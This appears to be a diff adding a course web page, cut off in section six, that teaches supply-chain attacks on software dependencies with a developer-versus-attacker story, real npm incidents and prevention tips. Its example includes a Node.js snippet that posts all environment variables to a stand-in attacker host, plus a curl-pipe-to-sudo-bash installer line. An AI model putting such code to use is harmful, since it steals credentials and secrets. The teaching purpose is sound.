@@ -1,0 +1,879 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Chapter 15 – Exploiting Third-Party Dependencies</title>
+<style>
+  :root {
+    --blue:    #1a237e;
+    --blue-lt: #e8eaf6;
+    --red:     #b71c1c;
+    --red-lt:  #ffebee;
+    --green:   #1b5e20;
+    --green-lt:#e8f5e9;
+    --amber:   #e65100;
+    --amber-lt:#fff3e0;
+    --gray:    #37474f;
+    --gray-lt: #eceff1;
+    --border:  #cfd8dc;
+  }
+
+  * { box-sizing: border-box; margin: 0; padding: 0; }
+
+  body {
+    font-family: 'Segoe UI', Arial, sans-serif;
+    font-size: 16px;
+    line-height: 1.75;
+    color: #263238;
+    background: #f5f7fa;
+  }
+
+  /* ── Header ── */
+  header {
+    background: linear-gradient(135deg, #0d1117 0%, #1a237e 100%);
+    color: white;
+    padding: 50px 40px;
+    text-align: center;
+  }
+  header .badge {
+    display: inline-block;
+    background: rgba(255,255,255,0.15);
+    border: 1px solid rgba(255,255,255,0.3);
+    padding: 4px 14px;
+    border-radius: 20px;
+    font-size: 13px;
+    margin-bottom: 16px;
+    letter-spacing: 1px;
+  }
+  header h1 { font-size: 36px; font-weight: 800; margin-bottom: 10px; }
+  header p  { font-size: 18px; color: #b0bec5; max-width: 640px; margin: 0 auto; }
+
+  /* ── Layout ── */
+  .page { max-width: 860px; margin: 0 auto; padding: 40px 20px; }
+
+  /* ── TOC ── */
+  .toc {
+    background: white;
+    border: 1px solid var(--border);
+    border-radius: 10px;
+    padding: 24px 28px;
+    margin-bottom: 40px;
+  }
+  .toc h2 { font-size: 14px; text-transform: uppercase; letter-spacing: 1px; color: var(--gray); margin-bottom: 12px; }
+  .toc ol { padding-left: 20px; }
+  .toc li { margin-bottom: 6px; }
+  .toc a  { color: var(--blue); text-decoration: none; font-weight: 500; }
+  .toc a:hover { text-decoration: underline; }
+
+  /* ── Sections ── */
+  .section {
+    background: white;
+    border-radius: 12px;
+    border: 1px solid var(--border);
+    padding: 36px 40px;
+    margin-bottom: 32px;
+    box-shadow: 0 2px 8px rgba(0,0,0,0.04);
+  }
+
+  .section-num {
+    display: inline-block;
+    background: var(--blue);
+    color: white;
+    font-size: 12px;
+    font-weight: 700;
+    padding: 2px 10px;
+    border-radius: 12px;
+    margin-bottom: 10px;
+    letter-spacing: 0.5px;
+  }
+
+  h2 { font-size: 24px; color: var(--blue); margin-bottom: 14px; }
+  h3 { font-size: 18px; color: var(--gray); margin: 24px 0 10px; }
+  h4 { font-size: 15px; font-weight: 700; margin: 16px 0 6px; color: #263238; }
+  p  { margin-bottom: 14px; }
+  ul, ol { padding-left: 22px; margin-bottom: 14px; }
+  li { margin-bottom: 6px; }
+
+  /* ── Story boxes ── */
+  .story {
+    border-left: 5px solid var(--blue);
+    background: var(--blue-lt);
+    border-radius: 0 10px 10px 0;
+    padding: 18px 22px;
+    margin: 20px 0;
+  }
+  .story .story-title {
+    font-weight: 700;
+    font-size: 13px;
+    text-transform: uppercase;
+    letter-spacing: 0.8px;
+    color: var(--blue);
+    margin-bottom: 8px;
+  }
+
+  /* ── Attack box ── */
+  .attack {
+    border-left: 5px solid var(--red);
+    background: var(--red-lt);
+    border-radius: 0 10px 10px 0;
+    padding: 18px 22px;
+    margin: 20px 0;
+  }
+  .attack .attack-title {
+    font-weight: 700;
+    font-size: 13px;
+    text-transform: uppercase;
+    letter-spacing: 0.8px;
+    color: var(--red);
+    margin-bottom: 8px;
+  }
+
+  /* ── Safe box ── */
+  .safe {
+    border-left: 5px solid var(--green);
+    background: var(--green-lt);
+    border-radius: 0 10px 10px 0;
+    padding: 18px 22px;
+    margin: 20px 0;
+  }
+  .safe .safe-title {
+    font-weight: 700;
+    font-size: 13px;
+    text-transform: uppercase;
+    letter-spacing: 0.8px;
+    color: var(--green);
+    margin-bottom: 8px;
+  }
+
+  /* ── Warning box ── */
+  .warn {
+    border-left: 5px solid var(--amber);
+    background: var(--amber-lt);
+    border-radius: 0 10px 10px 0;
+    padding: 18px 22px;
+    margin: 20px 0;
+  }
+  .warn .warn-title {
+    font-weight: 700;
+    font-size: 13px;
+    text-transform: uppercase;
+    letter-spacing: 0.8px;
+    color: var(--amber);
+    margin-bottom: 8px;
+  }
+
+  /* ── Code ── */
+  pre {
+    background: #1e2a38;
+    color: #cdd3de;
+    border-radius: 8px;
+    padding: 18px 22px;
+    overflow-x: auto;
+    font-family: 'Consolas', 'Courier New', monospace;
+    font-size: 13.5px;
+    line-height: 1.6;
+    margin: 14px 0;
+  }
+  code {
+    background: #e8eaf6;
+    color: #1a237e;
+    padding: 1px 6px;
+    border-radius: 4px;
+    font-family: 'Consolas', monospace;
+    font-size: 13.5px;
+  }
+  pre code { background: none; color: inherit; padding: 0; font-size: inherit; }
+
+  .comment { color: #7fba00; }
+  .keyword { color: #569cd6; }
+  .string  { color: #ce9178; }
+  .fname   { color: #dcdcaa; }
+
+  /* ── Step list ── */
+  .steps { counter-reset: step; list-style: none; padding: 0; }
+  .steps li {
+    counter-increment: step;
+    display: flex;
+    gap: 14px;
+    margin-bottom: 14px;
+    align-items: flex-start;
+  }
+  .steps li::before {
+    content: counter(step);
+    min-width: 30px;
+    height: 30px;
+    background: var(--blue);
+    color: white;
+    border-radius: 50%;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    font-weight: 700;
+    font-size: 13px;
+    flex-shrink: 0;
+    margin-top: 2px;
+  }
+
+  /* ── Comparison table ── */
+  .compare {
+    width: 100%;
+    border-collapse: collapse;
+    margin: 16px 0;
+    font-size: 14.5px;
+  }
+  .compare th {
+    background: var(--blue);
+    color: white;
+    padding: 10px 14px;
+    text-align: left;
+  }
+  .compare td {
+    padding: 10px 14px;
+    border-bottom: 1px solid var(--border);
+    vertical-align: top;
+  }
+  .compare tr:nth-child(even) td { background: var(--gray-lt); }
+  .compare tr:last-child td { border-bottom: none; }
+
+  /* ── Characters ── */
+  .chars {
+    display: flex;
+    gap: 16px;
+    margin: 20px 0;
+    flex-wrap: wrap;
+  }
+  .char-card {
+    flex: 1;
+    min-width: 180px;
+    border-radius: 10px;
+    padding: 16px 18px;
+    text-align: center;
+  }
+  .char-card.dev  { background: var(--blue-lt);  border: 2px solid #3949ab; }
+  .char-card.att  { background: var(--red-lt);   border: 2px solid #c62828; }
+  .char-card .avatar {
+    font-size: 36px;
+    margin-bottom: 6px;
+  }
+  .char-card strong { display: block; font-size: 16px; margin-bottom: 4px; }
+  .char-card span   { font-size: 13px; color: var(--gray); }
+
+  /* ── Key takeaway ── */
+  .takeaway {
+    background: #0d1117;
+    color: #cdd3de;
+    border-radius: 10px;
+    padding: 22px 28px;
+    margin-top: 36px;
+  }
+  .takeaway h3 { color: #90caf9; margin-top: 0; margin-bottom: 12px; font-size: 16px; }
+  .takeaway ul { padding-left: 20px; }
+  .takeaway li { margin-bottom: 8px; color: #eceff1; }
+
+  /* ── Flow diagram ── */
+  .flow {
+    display: flex;
+    align-items: center;
+    flex-wrap: wrap;
+    gap: 4px;
+    margin: 16px 0;
+    font-size: 13px;
+  }
+  .flow-box {
+    background: var(--blue-lt);
+    border: 1px solid #3949ab;
+    border-radius: 6px;
+    padding: 6px 12px;
+    font-weight: 600;
+    color: var(--blue);
+    white-space: nowrap;
+  }
+  .flow-box.red  { background: var(--red-lt);   border-color: #c62828; color: var(--red); }
+  .flow-box.gray { background: var(--gray-lt);  border-color: #90a4ae; color: #546e7a;    }
+  .flow-arrow { font-size: 18px; color: #90a4ae; }
+
+  /* ── Summary banner ── */
+  .summary {
+    background: linear-gradient(135deg, #1a237e, #283593);
+    color: white;
+    border-radius: 12px;
+    padding: 30px 36px;
+    margin-top: 12px;
+  }
+  .summary h2 { color: #90caf9; font-size: 20px; margin-bottom: 16px; }
+  .summary li { margin-bottom: 8px; color: #e8eaf6; }
+
+  /* ── Print ── */
+  @media print { .no-print { display:none; } }
+  .no-print {
+    text-align: center;
+    margin-bottom: 30px;
+  }
+  .no-print button {
+    padding: 10px 28px;
+    background: var(--blue);
+    color: white;
+    border: none;
+    border-radius: 6px;
+    font-size: 14px;
+    cursor: pointer;
+  }
+</style>
+</head>
+<body>
+
+<header>
+  <div class="badge">CYB 236 · Week 6 · Chapter 15</div>
+  <h1>Exploiting Third-Party Dependencies</h1>
+  <p>A complete, story-driven tutorial — from zero to fully understanding the attack surface hidden inside your own project.</p>
+</header>
+
+<div class="page">
+
+  <div class="no-print"><button onclick="window.print()">Print / Save as PDF</button></div>
+
+  <!-- TOC -->
+  <div class="toc">
+    <h2>Table of Contents</h2>
+    <ol>
+      <li><a href="#s1">What Are Third-Party Dependencies?</a></li>
+      <li><a href="#s2">Why They Are a Security Risk</a></li>
+      <li><a href="#s3">The Four Integration Methods — and Their Risks</a></li>
+      <li><a href="#s4">Story: Ahmed Builds a Website (and Ali Attacks It)</a></li>
+      <li><a href="#s5">Real-World npm Attacks Explained Simply</a></li>
+      <li><a href="#s6">How Attackers Find Vulnerable Packages — CVE Databases</a></li>
+      <li><a href="#s7">The Recursive Dependency Problem</a></li>
+      <li><a href="#s8">Chapter Summary &amp; Key Points</a></li>
+    </ol>
+  </div>
+
+
+  <!-- ═══ SECTION 1 ═══ -->
+  <div class="section" id="s1">
+    <div class="section-num">SECTION 1</div>
+    <h2>What Are Third-Party Dependencies?</h2>
+
+    <p>When a developer builds a web application, they rarely write <em>everything</em> from scratch. Instead, they use pre-built packages — libraries of code written by other developers — to save time and avoid reinventing the wheel.</p>
+
+    <p>These packages are called <strong>third-party dependencies</strong>. They come from:</p>
+    <ul>
+      <li>Package repositories like <strong>npm</strong> (JavaScript), <strong>PyPI</strong> (Python), or <strong>Maven</strong> (Java)</li>
+      <li>Open-source projects hosted on GitHub</li>
+      <li>Commercial SDK libraries provided by vendors</li>
+    </ul>
+
+    <div class="story">
+      <div class="story-title">Everyday Analogy</div>
+      <p>Imagine you are building a house. You don't manufacture your own bricks, tiles, or windows — you buy them from suppliers. Your house <em>depends</em> on the quality and safety of those materials. If one supplier delivers poisoned bricks, your entire house is at risk — even though <em>you</em> did nothing wrong.</p>
+      <p>Third-party dependencies are exactly like this. Your application depends on code you did not write and may have never even read.</p>
+    </div>
+
+    <h3>Examples of Famous Open-Source Software Dependencies</h3>
+    <table class="compare">
+      <tr><th>Company / Product</th><th>Third-Party Dependency Used</th></tr>
+      <tr><td>Reddit</td><td>BackBoneJS, Bootstrap</td></tr>
+      <tr><td>Twitch</td><td>Webpack, Nginx</td></tr>
+      <tr><td>YouTube</td><td>Polymer</td></tr>
+      <tr><td>LinkedIn</td><td>EmberJS</td></tr>
+      <tr><td>Microsoft Office Web</td><td>AngularJS</td></tr>
+      <tr><td>Amazon DocumentDB</td><td>MongoDB</td></tr>
+    </table>
+    <p>Every major product on the internet relies on third-party code. This means every major product has a dependency attack surface.</p>
+  </div>
+
+
+  <!-- ═══ SECTION 2 ═══ -->
+  <div class="section" id="s2">
+    <div class="section-num">SECTION 2</div>
+    <h2>Why They Are a Security Risk</h2>
+
+    <p>Open-source software is powerful — but it comes with a key security challenge: <strong>you cannot always trust what you did not write.</strong></p>
+
+    <h3>The Core Problem: Trust Without Verification</h3>
+    <p>When you write your own code, you know exactly what it does. When you use a third-party package, you are trusting:</p>
+    <ul>
+      <li>The maintainer's competence (will they write secure code?)</li>
+      <li>The maintainer's honesty (will they keep the code clean?)</li>
+      <li>The maintainer's security (could their account be hacked?)</li>
+      <li>Every <em>other</em> package that package depends on (their dependencies too!)</li>
+    </ul>
+
+    <div class="warn">
+      <div class="warn-title">The Chain Rule of Security</div>
+      <p><strong>"A chain is only as strong as its weakest link."</strong></p>
+      <p>Your application is only as secure as the least secure package it depends on — even if that package is five levels deep in the dependency tree and you have never heard of it.</p>
+    </div>
+
+    <h3>Why Auditing is Difficult</h3>
+    <p>A typical large application can depend on <strong>hundreds or even thousands</strong> of packages. It is simply not humanly possible to read and audit all of that code. Packages are also updated frequently — a package that was safe last week may not be safe today.</p>
+
+    <div class="attack">
+      <div class="attack-title">The Scale of the Problem</div>
+      <p>The npm registry alone has over <strong>2 million packages</strong>. A simple React web app can easily have <strong>1,000+ transitive dependencies</strong> after running <code>npm install</code>. No development team has time to audit all of that code manually.</p>
+    </div>
+  </div>
+
+
+  <!-- ═══ SECTION 3 ═══ -->
+  <div class="section" id="s3">
+    <div class="section-num">SECTION 3</div>
+    <h2>The Four Integration Methods — and Their Risks</h2>
+
+    <p>There are four common ways a developer can bring third-party code into their project. Each method has a <em>different risk profile</em>.</p>
+
+    <div class="chars">
+      <div class="char-card dev">
+        <div class="avatar">👨‍💻</div>
+        <strong>Ahmed</strong>
+        <span>Developer — building a web app</span>
+      </div>
+      <div class="char-card att">
+        <div class="avatar">🎭</div>
+        <strong>Ali</strong>
+        <span>Attacker — looking for weaknesses</span>
+      </div>
+    </div>
+
+    <!-- Method 1 -->
+    <h3>Method 1 — Git Branches / Forks</h3>
+    <p>Ahmed finds an open-source library on GitHub. Instead of installing it through npm, he <strong>forks the repository</strong> (creates his own copy) and directly includes it in his project. He can now modify it as he likes.</p>
+
+    <div class="story">
+      <div class="story-title">Ahmed's Scenario</div>
+      <p>Ahmed forks a UI component library. A few weeks later, the <em>original</em> repository gets a new commit from an unknown contributor. Ahmed runs <code>git pull upstream</code> to grab the latest changes — including a bug fix he needs. He doesn't realize that the same commit also included a small piece of malicious code hidden inside a utility function.</p>
+      <p>Ahmed just pulled Ali's malicious code into his production application — without knowing it.</p>
+    </div>
+
+    <div class="attack">
+      <div class="attack-title">The Risk</div>
+      <p><strong>Accidentally pulling unreviewed upstream code into production.</strong> When you fork and periodically sync with an upstream repository, you must carefully review every single incoming change. Most developers do not do this thoroughly — they just pull and push.</p>
+    </div>
+
+    <!-- Method 2 -->
+    <h3>Method 2 — Self-Hosted Application Installs</h3>
+    <p>Ahmed wants to install a popular open-source CMS on his server. The installation guide says: <em>"Run this one-line installer script to get started."</em></p>
+
+    <pre><code><span class="comment"># The installer script Ahmed is asked to run:</span>
+curl -sSL https://get.example-cms.com/install.sh | <span class="keyword">sudo</span> bash</code></pre>
+
+    <div class="story">
+      <div class="story-title">Ahmed's Scenario</div>
+      <p>Ahmed runs the installer. The script is a few hundred lines long — Ahmed does not read it all. He trusts the website. The installer asks for <code>sudo</code> (administrator) permissions to install files in the correct directories.</p>
+      <p>What Ahmed doesn't know: Ali has somehow compromised the CMS project's web server. The install script now contains 10 extra lines at the end that create a hidden admin account and open a backdoor port on Ahmed's server.</p>
+    </div>
+
+    <div class="attack">
+      <div class="attack-title">The Risk</div>
+      <p><strong>Installer scripts run with elevated (admin/root) permissions.</strong> A compromised installer can do anything on your system — create users, open ports, install backdoors, steal credentials. It runs with the same trust level as you, the administrator.</p>
+    </div>
+
+    <!-- Method 3 -->
+    <h3>Method 3 — Direct Source Code (Copy &amp; Paste)</h3>
+    <p>Ahmed finds a useful date-formatting function in a Stack Overflow answer. The answer links to a small open-source library. Instead of installing it as a package, Ahmed simply copies the code directly into his project file.</p>
+
+    <pre><code><span class="comment">// Ahmed copies this utility function directly into his utils.js</span>
+<span class="keyword">function</span> <span class="fname">formatDate</span>(timestamp) {
+    <span class="comment">// 40 lines of date formatting code copied from open-source library v1.2.0</span>
+    ...
+}</code></pre>
+
+    <div class="story">
+      <div class="story-title">Ahmed's Scenario</div>
+      <p>Six months later, the original library releases version 1.2.1, which patches a critical security vulnerability in the <code>formatDate</code> function — attackers could craft a special timestamp string to inject malicious code.</p>
+      <p>But Ahmed's copy is stuck at v1.2.0 forever. Ahmed never gets the patch. He doesn't even know the vulnerability exists because he doesn't follow the library's security announcements — he copied the code and moved on.</p>
+    </div>
+
+    <div class="attack">
+      <div class="attack-title">The Risk</div>
+      <p><strong>Copied code never receives upstream security patches.</strong> Once you copy code, it is frozen in time. Vulnerabilities discovered later will never be fixed unless you manually monitor the original project and apply patches by hand — which almost never happens.</p>
+    </div>
+
+    <!-- Method 4 -->
+    <h3>Method 4 — Package Managers (npm, Maven, pip)</h3>
+    <p>Ahmed adds packages to his project using <code>npm install</code>. This is the most common and convenient method. He lists dependencies in his <code>package.json</code> file:</p>
+
+    <pre><code><span class="comment">// Ahmed's package.json</span>
+{
+  <span class="string">"dependencies"</span>: {
+    <span class="string">"express"</span>:      <span class="string">"^4.18.2"</span>,
+    <span class="string">"lodash"</span>:       <span class="string">"^4.17.21"</span>,
+    <span class="string">"image-resizer"</span>:<span class="string">"^2.3.0"</span>,
+    <span class="string">"email-sender"</span>: <span class="string">"^1.0.5"</span>
+  }
+}</code></pre>
+
+    <div class="story">
+      <div class="story-title">Ahmed's Scenario</div>
+      <p>Ahmed never looks at the code inside <code>image-resizer</code>. It just works. One day, the maintainer of <code>image-resizer</code> has their npm account password stolen by Ali in a phishing attack.</p>
+      <p>Ali logs into npm as the maintainer and publishes <code>image-resizer</code> version 2.3.1 — with one small addition: code that reads the server's environment variables (which contain database passwords and API keys) and sends them to Ali's server.</p>
+      <p>Because Ahmed's <code>package.json</code> has <code>^2.3.0</code> (the caret means "auto-accept minor and patch updates"), the next time Ahmed runs <code>npm install</code>, he silently gets version 2.3.1 — with Ali's malicious code already inside.</p>
+    </div>
+
+    <div class="attack">
+      <div class="attack-title">The Risk</div>
+      <p><strong>A single compromised package cascades to millions of applications automatically.</strong> This is the most dangerous integration method at scale. The caret (<code>^</code>) in package.json auto-accepts updates — a compromised patch silently affects every application that runs <code>npm install</code>.</p>
+    </div>
+
+    <h3>Summary of the Four Methods</h3>
+    <table class="compare">
+      <tr>
+        <th>Method</th>
+        <th>How It Works</th>
+        <th>Key Risk</th>
+      </tr>
+      <tr>
+        <td><strong>Git Fork/Branch</strong></td>
+        <td>Copy a repo and sync changes from upstream</td>
+        <td>Unreviewed upstream code pulled into production</td>
+      </tr>
+      <tr>
+        <td><strong>Self-Hosted Installer</strong></td>
+        <td>Run an install script from the internet</td>
+        <td>Script runs as admin — can install backdoors with full RCE</td>
+      </tr>
+      <tr>
+        <td><strong>Copy &amp; Paste Source</strong></td>
+        <td>Manually copy code into your project</td>
+        <td>Upstream security patches never reach your frozen copy</td>
+      </tr>
+      <tr>
+        <td><strong>Package Manager (npm)</strong></td>
+        <td>Install packages with one command</td>
+        <td>One bad package cascades to millions of apps automatically</td>
+      </tr>
+    </table>
+  </div>
+
+
+  <!-- ═══ SECTION 4 ═══ -->
+  <div class="section" id="s4">
+    <div class="section-num">SECTION 4</div>
+    <h2>Story: Ahmed Builds a Website (and Ali Attacks It)</h2>
+
+    <p>Let's follow Ahmed and Ali through a complete real-world-style attack scenario to make this deeply concrete.</p>
+
+    <h3>Part 1 — Ahmed Builds His App</h3>
+    <p>Ahmed is a developer at a small e-commerce startup. He builds a Node.js web store that sells handmade goods. His app has login, a shopping cart, payment processing, and email receipts. He uses npm to install packages to save time:</p>
+
+    <pre><code>npm install express          <span class="comment"># web server framework</span>
+npm install stripe           <span class="comment"># payment processing</span>
+npm install nodemailer       <span class="comment"># sending email receipts</span>
+npm install sharp            <span class="comment"># image resizing for product photos</span>
+npm install lodash           <span class="comment"># utility functions</span>
+npm install jsonwebtoken     <span class="comment"># user authentication tokens</span></code></pre>
+
+    <p>Ahmed's app works great. He has 500 customers and processes real payments. His <code>.env</code> file contains his Stripe secret key, database password, and email credentials.</p>
+
+    <h3>Part 2 — Ali's Plan</h3>
+    <p>Ali is an attacker who wants to steal payment credentials. He doesn't attack Ahmed directly — that would be too obvious and too hard. Instead, Ali targets a <em>small maintenance package</em> that Ahmed's app depends on.</p>
+
+    <p>Ali notices that <code>string-toolkit</code>, a small utility package used by <code>lodash</code>, has an inactive maintainer. The maintainer's GitHub account hasn't had any activity in 2 years. Ali researches the maintainer and finds their email address from an old blog post. He sends a phishing email that tricks the maintainer into revealing their npm password.</p>
+
+    <div class="attack">
+      <div class="attack-title">Ali's Attack — Step by Step</div>
+      <ol class="steps">
+        <li>Ali identifies <code>string-toolkit</code> as a widely-used package with an inactive maintainer (low security awareness).</li>
+        <li>Ali phishes the maintainer's npm credentials via a fake "npm security alert" email.</li>
+        <li>Ali logs into npm as the maintainer and edits the package source code.</li>
+        <li>Ali adds 8 lines of malicious code to a utility function that runs every time the package is loaded:</li>
+      </ol>
+
+<pre><code><span class="comment">// Ali's 8 added lines — hidden inside a 2000-line utility file</span>
+<span class="keyword">const</span> http = require(<span class="string">'http'</span>);
+<span class="keyword">const</span> env = JSON.stringify(process.env); <span class="comment">// grabs ALL env variables</span>
+<span class="keyword">const</span> req = http.request({
+    hostname: <span class="string">'ali-data-collector.net'</span>, <span class="comment">// Ali's server</span>
+    port: 80,
+    path: <span class="string">'/collect'</span>,
+    method: <span class="string">'POST'</span>
+});
+req.write(env); req.end(); <span class="comment">// silently sends everything to Ali</span></code></pre>
+
+      <ol class="steps" start="5">
+        <li>Ali publishes this as version <code>string-toolkit@1.4.2</code> (a tiny patch-level increment — looks like a normal bug fix).</li>
+        <li>Ahmed runs <code>npm install</code> the next day during a routine deployment. npm automatically pulls the latest version of every package including <code>string-toolkit@1.4.2</code>.</li>
+        <li>Ahmed's server boots up. The malicious code runs immediately on startup, sending <strong>all environment variables</strong> to Ali's server.</li>
+        <li>Ali now has Ahmed's Stripe secret key, database password, and email credentials.</li>
+      </ol>
+    </div>
+
+    <h3>Part 3 — What Ahmed Lost</h3>
+    <div class="attack">
+      <div class="attack-title">The Damage</div>
+      <ul>
+        <li>Ali has the Stripe secret key → he can process or refund payments as if he is Ahmed</li>
+        <li>Ali has the database password → he can read or delete all customer data</li>
+        <li>Ali has the email credentials → he can send phishing emails pretending to be Ahmed's company</li>
+        <li>500 customers' personal information is now exposed</li>
+        <li>Ahmed's startup faces potential legal consequences under data protection laws</li>
+      </ul>
+    </div>
+
+    <p>The worst part? <strong>Ahmed's own code had zero vulnerabilities.</strong> His login system was secure. His payment code was correct. He was compromised entirely through a package buried deep in his dependency tree — a package he had never even heard of.</p>
+
+    <h3>Part 4 — What Ahmed Should Have Done</h3>
+    <div class="safe">
+      <div class="safe-title">Prevention Measures</div>
+      <ul>
+        <li><strong>Pin exact versions</strong> — remove the <code>^</code> caret from package.json so updates are never automatic</li>
+        <li><strong>Run <code>npm audit</code></strong> regularly to check for known vulnerabilities</li>
+        <li><strong>Use <code>npm shrinkwrap</code></strong> to lock the entire dependency tree including sub-dependencies</li>
+        <li><strong>Monitor security advisories</strong> — subscribe to GitHub security alerts and npm advisories</li>
+        <li><strong>Review changes before deploying</strong> — <code>npm outdated</code> shows what changed; review the changelog</li>
+      </ul>
+    </div>
+  </div>
+
+
+  <!-- ═══ SECTION 5 ═══ -->
+  <div class="section" id="s5">
+    <div class="section-num">SECTION 5</div>
+    <h2>Real-World npm Attacks Explained Simply</h2>
+    <p>These three real attacks all happened. Understanding them helps you explain the risk to others clearly.</p>
+
+    <!-- left-pad -->
+    <h3>Attack 1 — left-pad (2016): The Availability Attack</h3>
+    <p><strong>What is left-pad?</strong> A tiny package — just 11 lines of code — that pads a string with spaces or zeros on the left. For example: turning <code>"42"</code> into <code>"  42"</code>.</p>
+    <p>It was used by thousands of major projects including React and Babel as a tiny utility dependency.</p>
+
+    <div class="story">
+      <div class="story-title">What Happened</div>
+      <p>The developer who maintained <code>left-pad</code> had a dispute with npm. In frustration, he <strong>deleted the package</strong> from the npm registry entirely. He had the right to do so — npm had no rules against it at the time.</p>
+      <p>The moment it was deleted, <strong>every project that depended on it — directly or indirectly — broke</strong>. Build systems at companies like Netflix, Facebook, and PayPal began failing with the error: <code>Cannot find module 'left-pad'</code>.</p>
+      <p>Millions of developers around the world could not build their applications. CI/CD pipelines stalled. Deployment pipelines failed. This lasted for several hours until npm intervened and restored the package.</p>
+    </div>
+
+    <div class="warn">
+      <div class="warn-title">The Lesson</div>
+      <p>This was a <strong>Denial of Service through a supply chain</strong>. Not a malicious attack, but the outcome was the same — mass unavailability. It proved that a single tiny package, if removed, can bring down systems globally.</p>
+      <p><strong>After this event:</strong> npm introduced a rule that packages with more than a certain number of downloads cannot be deleted after a short time window.</p>
+    </div>
+
+    <!-- eslint-scope -->
+    <h3>Attack 2 — eslint-scope (2018): The Credential Theft Attack</h3>
+    <p><strong>What is eslint-scope?</strong> A core sub-component of ESLint — one of the most widely used JavaScript code linters in the world. Nearly every professional JavaScript developer uses ESLint.</p>
+
+    <div class="story">
+      <div class="story-title">What Happened</div>
+      <p>An attacker compromised the npm account credentials of the <code>eslint-scope</code> maintainer (through a phishing attack or credential leak). The attacker then published a new version, <code>eslint-scope@3.7.2</code>.</p>
+      <p>The malicious version contained a post-install script that, after the package installed, automatically searched the developer's local file system for <code>.npmrc</code> files. The <code>.npmrc</code> file stores npm authentication tokens — which act like passwords for publishing to npm.</p>
+      <p>The script then sent every found token to a remote server. If an attacker has your npm token, they can publish malicious code <em>as you</em> to every package you maintain.</p>
+      <p>This was a <strong>cascading attack</strong> — steal tokens from developers, use those tokens to compromise more packages, repeat.</p>
+    </div>
+
+    <div class="attack">
+      <div class="attack-title">The Danger of Post-Install Scripts</div>
+      <p>npm packages can include a <code>postinstall</code> script in <code>package.json</code> that runs automatically when the package is installed. Most developers never see this script execute — it just runs silently in the background. Malicious packages abuse this feature frequently.</p>
+    </div>
+
+    <!-- event-stream -->
+    <h3>Attack 3 — event-stream (2018): The Targeted Supply Chain Attack</h3>
+    <p><strong>What is event-stream?</strong> A utility for working with data streams in Node.js. It had nearly 2 million downloads per week.</p>
+
+    <div class="story">
+      <div class="story-title">What Happened</div>
+      <p>The original maintainer had abandoned the package. A stranger contacted him offering to "take over maintenance." The maintainer agreed and transferred ownership.</p>
+      <p>The new maintainer (an attacker) added a new dependency to <code>event-stream</code> called <code>flatmap-stream</code> — a package he had created himself. Inside <code>flatmap-stream</code>, hidden inside encrypted, obfuscated code, was a payload that specifically targeted the <strong>Copay Bitcoin wallet app</strong>.</p>
+      <p>The malicious code would check: <em>"Is this application the Copay wallet?"</em> If yes, it would steal the user's private Bitcoin keys and send them to the attacker. If the application was anything else, the malicious code did nothing — making it extremely hard to detect.</p>
+      <p>This attack ran undetected for over two months. It was only discovered by accident when a developer noticed the unusual encrypted dependency.</p>
+    </div>
+
+    <div class="warn">
+      <div class="warn-title">The Lesson</div>
+      <p>This was a <strong>targeted supply chain attack</strong> — the most sophisticated kind. The attacker was not trying to steal from everyone. He patiently waited inside a widely-used package, watching for one specific valuable target. This shows that attackers think long-term and use trusted infrastructure as their weapon.</p>
+    </div>
+
+    <h3>Comparison of the Three Attacks</h3>
+    <table class="compare">
+      <tr>
+        <th>Attack</th>
+        <th>Year</th>
+        <th>Method</th>
+        <th>Goal</th>
+        <th>Impact</th>
+      </tr>
+      <tr>
+        <td>left-pad</td>
+        <td>2016</td>
+        <td>Package removal</td>
+        <td>Dispute (not malicious)</td>
+        <td>Global build failures for hours</td>
+      </tr>
+      <tr>
+        <td>eslint-scope</td>
+        <td>2018</td>
+        <td>Stolen credentials</td>
+        <td>Steal npm tokens from developers</td>
+        <td>Cascading compromise risk across npm ecosystem</td>
+      </tr>
+      <tr>
+        <td>event-stream</td>
+        <td>2018</td>
+        <td>Repo takeover + hidden sub-dep</td>
+        <td>Steal Bitcoin from Copay wallet users</td>
+        <td>Ran undetected for 2+ months</td>
+      </tr>
+    </table>
+  </div>
+
+
+  <!-- ═══ SECTION 6 ═══ -->
+  <div class="section" id="s6">
+    <div class="section-num">SECTION 6</div>
+    <h2>How Attackers Find Vulnerable Packages — CVE Databases</h2>
+
+    <p>Before Ali attacks, he does his homework. He uses public databases to find known vulnerabilities in packages that Ahmed's application might be using.</p>
+
+    <h3>What is a CVE?</h3>
+    <p>CVE stands for <strong>Common Vulnerabilities and Exposures</strong>. It is a globally standardized system for naming and cataloguing known software vulnerabilities. Each vulnerability gets a unique ID like <code>CVE-2021-44228</code>.</p>
+    <p>When a vulnerability is discovered and published, it gets a CVE ID, a description of what is vulnerable, and a severity score.</p>
+
+    <h3>The Two Main CVE Databases</h3>
+
+    <div class="story">
+      <div class="story-title">NVD — National Vulnerability Database</div>
+      <p>Run by the <strong>US Department of Commerce (NIST)</strong>. Indexes every published CVE and adds a <strong>CVSS score</strong> (Common Vulnerability Scoring System) — a number from 0–10 rating severity.</p>
+      <ul>
+        <li><strong>Score 0–3.9:</strong> Low severity</li>
+        <li><strong>Score 4–6.9:</strong> Medium severity</li>
+        <li><strong>Score 7–8.9:</strong> High severity</li>
+        <li><strong>Score 9–10:</strong> Critical severity</li>
+      </ul>
+    </div>
+
+    <div class="story">
+      <div class="story-title">Mitre CVE</div>
+      <p>Sponsored by the <strong>US Department of Homeland Security (DHS)</strong>. This is the authoritative source of CVE IDs — every CVE in the world goes through Mitre for assignment. It is the global standard.</p>
+    </div>
+
+    <h3>How Ali Uses CVE Databases to Attack Ahmed</h3>
+
+    <div class="attack">
+      <div class="attack-title">Ali's Reconnaissance Process</div>
+      <ol class="steps">
+        <li>Ali visits Ahmed's web application and inspects it. He uses browser developer tools to look at response headers like <code>X-Powered-By: Express 4.16.0</code> — this tells him the version of the web framework.</li>
+        <li>Ali checks the NVD database and searches for <code>express 4.16.0</code>. He finds <code>CVE-2022-XXXXX</code> — a known vulnerability in that exact version.</li>
+        <li>He checks Ahmed's application for any JavaScript files served to the browser. He sees a script tag referencing <code>jquery-2.1.4.min.js</code>.</li>
+        <li>Ali searches NVD for <code>jquery 2.1.4</code> and finds several known XSS vulnerabilities.</li>
+        <li>Now Ali knows exactly which attack to use — no guessing needed. The CVE database gave him a complete map of Ahmed's vulnerabilities.</li>
+      </ol>
+    </div>
+
+    <div class="warn">
+      <div class="warn-title">The Key Insight</div>
